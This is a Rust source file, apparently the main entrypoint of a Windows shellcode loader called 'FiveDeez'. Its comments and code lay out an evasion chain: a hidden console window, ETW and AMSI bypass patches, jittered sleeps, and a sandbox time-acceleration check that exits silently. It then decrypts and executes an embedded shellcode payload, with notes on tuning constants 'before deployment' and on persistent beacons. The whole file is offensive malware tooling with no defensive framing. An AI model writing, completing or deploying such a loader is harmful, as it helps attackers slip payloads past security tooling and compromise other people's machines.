//! main.rs — FiveDeez shellcode loader entrypoint
//!
//! Execution order:
//!   1. ETW bypass      — silence Event Tracing for Windows
//!   2. AMSI bypass     — neutralise the AntiMalware Scan Interface
//!   3. Sleep / jitter  — sleep a random interval to defeat sandbox detonation
//!   4. Sleep compression check — abort if sandbox is accelerating time
//!   5. Decrypt         — AES-256-GCM decrypt the embedded shellcode blob
//!   6. Execute         — allocate RX memory, copy, create thread, wait
//!
//! Compile-time tuning constants (adjust before deployment):
//!   SLEEP_BASE_MS      — minimum pre-execution sleep (default 30 s)
//!   SLEEP_JITTER_MS    — maximum additional random jitter (default 60 s)
//!   SLEEP_COMPRESS_MS  — sleep used for sandbox check (default 10 s)
//!   SLEEP_TOLERANCE_MS — how much early-wake is tolerated (default 5 s)

#![windows_subsystem = "windows"] // no console window on Windows

mod bypass;
mod crypto;
mod loader;
mod shellcode;
mod timing;

// ---------------------------------------------------------------------------
// Compile-time timing constants
// ---------------------------------------------------------------------------

/// Base pre-execution sleep in milliseconds (30 seconds).
const SLEEP_BASE_MS:      u64 = 30_000;

/// Maximum additional jitter in milliseconds (up to 60 s extra = 90 s max).
const SLEEP_JITTER_MS:    u64 = 60_000;

/// Duration used for the sleep-compression sandbox check (10 seconds).
const SLEEP_COMPRESS_MS:  u64 = 10_000;

/// Tolerance for the compression check — if we wake more than this many ms
/// early, assume sandbox time acceleration and abort (5 seconds).
const SLEEP_TOLERANCE_MS: u64 = 5_000;

// ---------------------------------------------------------------------------

fn main() {
    // Step 1: ETW bypass
    // Non-fatal — log silently and continue if it fails (e.g. protected process)
    let _ = bypass::etw::patch();

    // Step 2: AMSI bypass
    let _ = bypass::amsi::patch();

    // Step 3: Jittered sleep (evades sandbox detonation windows)
    timing::jitter_sleep(SLEEP_BASE_MS, SLEEP_JITTER_MS);

    // Step 4: Sleep-compression check (detect sandbox time acceleration)
    if timing::sleep_compression_check(SLEEP_COMPRESS_MS, SLEEP_TOLERANCE_MS).is_err() {
        // Silent exit — give the sandbox nothing useful
        std::process::exit(0);
    }

    // Step 5: Decrypt embedded shellcode
    let shellcode = match crypto::decrypt() {
        Ok(sc) => sc,
        Err(_) => std::process::exit(0), // tampered binary — abort silently
    };

    // Step 6: Execute
    let _ = loader::execute(&shellcode);

    // Loader exits after the shellcode thread returns.
    // For persistent beacons the thread never returns, so we never reach here.
}
